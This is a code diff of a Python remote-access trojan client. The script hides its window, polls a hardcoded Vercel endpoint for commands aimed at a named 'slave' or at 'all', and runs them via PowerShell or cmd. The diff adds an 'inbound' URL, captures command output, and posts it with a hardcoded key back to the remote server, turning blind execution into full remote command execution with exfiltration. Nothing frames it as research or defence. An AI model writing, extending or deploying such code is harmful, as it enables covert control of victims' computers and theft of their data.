@@ -15,6 +15,7 @@ si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 si.wShowWindow = 0  
 url = "https://nextjs-boilerplate-azure-eight-88.vercel.app/api/"
 clients_url = "https://nextjs-boilerplate-azure-eight-88.vercel.app/api/clients"
+output_url = "https://nextjs-boilerplate-azure-eight-88.vercel.app/api/inbound"
 slave_key = "nickaqedfgvbyhnjmhngytfetrfgyuhj"
 pythonw = sys.executable.replace("python.exe", "pythonw.exe")
 if not os.path.exists(pythonw):
@@ -146,15 +147,19 @@ def fetch_message():
 
 
 def run_command(*args):
+    si = subprocess.STARTUPINFO()
+    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # hide window
+
     try:
-        subprocess.Popen(
+        result = subprocess.run(
             args,
             startupinfo=si,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL
+            capture_output=True,
+            text=True
         )
+        return result.stdout.strip()
     except Exception as e:
-        print(f"Exception occurred while running command: {e}")
+        return f"Exception occurred: {e}"
 
 
 
@@ -191,12 +196,18 @@ def main():
             if command[0] != slave_name and command[0] != "all":
                 continue
         # print(f'command:', command, ' command[1]:', command[1], ' command[2]:', command[2] if len(command) > 1 else 'N/A')
-            if command[1] == "execs":
+            if command[1] == "0execs":
                 #print("Executing PowerShell command...")
                 run_command("powershell.exe", "-Command", command[2])
-            elif command[1] == "execc":
+            elif command[1] == "0execc":
                 #print("Executing CMD command...")
                 run_command("cmd.exe", "/c " + command[2])
+            elif command[1] == "execc":
+                output = run_command("cmd.exe", "/c " + command[2])
+                requests.post(output_url, json={"key": slave_key, "text": f'{slave_name}:::{output}'})
+            elif command[1] == "execs":
+                output = run_command("powershell.exe","-Command",command[2])
+                requests.post(output_url, json={"key": slave_key, "text": f'{slave_name}:::{output}'})
             elif command[1] == "die":
                 break
             elif command[1] == "arm":
